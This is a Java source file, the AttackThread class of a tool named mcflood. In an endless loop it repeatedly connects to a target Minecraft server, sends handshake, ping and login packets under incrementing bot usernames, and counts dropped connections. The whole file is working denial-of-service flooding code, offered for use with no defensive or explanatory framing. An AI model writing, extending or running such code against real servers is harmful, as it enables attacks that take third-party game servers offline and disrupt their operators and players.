package me.xiaozhangup.mcflood;

import java.io.*;
import java.net.Socket;

public class AttackThread implements Runnable {
    @Override
    public void run() {
        while (true) {
            try {
                Socket s = new Socket(MCFlood.part1[0], MCFlood.port);
                //流准备
                InputStream is = s.getInputStream();
                DataInputStream di = new DataInputStream(is);
                OutputStream os = s.getOutputStream();
                DataOutputStream dos = new DataOutputStream(os);
                int temp;

                //握手
                MCFlood.writeVarInt(dos, Runner.hand.length); //prepend size
                dos.write(Runner.hand); //write handshake packet
                //跟小包
                MCFlood.writeVarInt(dos, Runner.pack.length); //prepend size
                dos.write(Runner.pack); //write handshake packet
                dos.flush();

                MCFlood.data = MCFlood.data + MCFlood.readVarInt(di);//读包大小
                MCFlood.readVarInt(di);
                byte[] temp1 = new byte[MCFlood.readVarInt(di)];
                di.readFully(temp1);

                try {
                    //ping包
                    MCFlood.writeVarInt(dos, Runner.ping.length); //prepend size
                    dos.write(Runner.ping); //write handshake packet
                    dos.flush();
                    MCFlood.data = MCFlood.data + MCFlood.readVarInt(di);
                    MCFlood.readVarInt(di);
                    di.readLong();
                    //di.readLong();
                } catch (Exception ignored) {

                }

                di.close();
                is.close();
                dos.close();
                os.close();
                s.close();

                s = new Socket(MCFlood.part1[0], MCFlood.port);
                //流准备
                is = s.getInputStream();
                di = new DataInputStream(is);
                os = s.getOutputStream();
                dos = new DataOutputStream(os);
                //第二次握手
                MCFlood.writeVarInt(dos, Runner.login.length); //prepend size
                dos.write(Runner.login); //write handshake packet
                ByteArrayOutputStream b;
                DataOutputStream handshake;
                b = new ByteArrayOutputStream();
                handshake = new DataOutputStream(b);
                handshake.write(0x00);
                String temp5 = MCFlood.text + MCFlood.point;
                MCFlood.point++;
                MCFlood.writeVarInt(handshake, temp5.length());
                handshake.writeBytes(temp5);
                byte[] username = b.toByteArray();
                MCFlood.writeVarInt(dos, username.length); //prepend size
                dos.write(username); //write handshake packet
                dos.flush();
                s.setSoTimeout(1500);
                while (true) {
                    try {
                        int length = MCFlood.readVarInt(di);
                        MCFlood.data = MCFlood.data + length;
                        byte[] lj = new byte[length];
                        di.readFully(lj);
                    } catch (Exception e) {
                        break;
                    }
                }
                //MCFlood.data=MCFlood.data+MCFlood.readVarInt(di);<--老子不要这个数据了
                di.close();
                is.close();
                dos.close();
                os.close();
                s.close();
            } catch (Exception e) {
                // TODO 自动生成的 catch 块
                //e.printStackTrace();
                MCFlood.killT++;
                //e.printStackTrace();
            }
        }
    }
}
